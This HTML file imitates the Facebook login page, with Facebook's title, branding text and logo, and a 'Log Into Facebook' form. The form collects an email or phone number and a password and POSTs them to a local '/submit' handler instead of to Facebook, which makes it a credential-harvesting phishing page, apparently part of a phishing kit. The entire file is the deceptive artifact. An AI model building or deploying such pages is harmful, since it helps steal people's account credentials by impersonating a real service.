<!DOCTYPE html>
<html>
<head>
  <title>Facebook - log in or sign up </title>
    <link rel="icon" type="image/x-icon" href="./logo.ico">
  <link rel="stylesheet" type="text/css" href="styles.css">

</head>
<body>
    <div class="new">
        <div class="container">
        <img src="./dF5SId3UHWd.svg" width="300">
        <h2>Connect with friends and the world around you on Facebook.</h2>
        </div>
        <div class="card container">
         <form action="/submit" method="POST">
            <center><label>Log Into Facebook</label></center><br>
            <input type="text" name="name" id="name" required placeholder="Email or phone number"><br>
            <input type="password" name="email" id="email" required
            placeholder="Password"><br>
            <button type="submit">Login</button>
        </form>
      </div>
    </div>
</body>
</html>
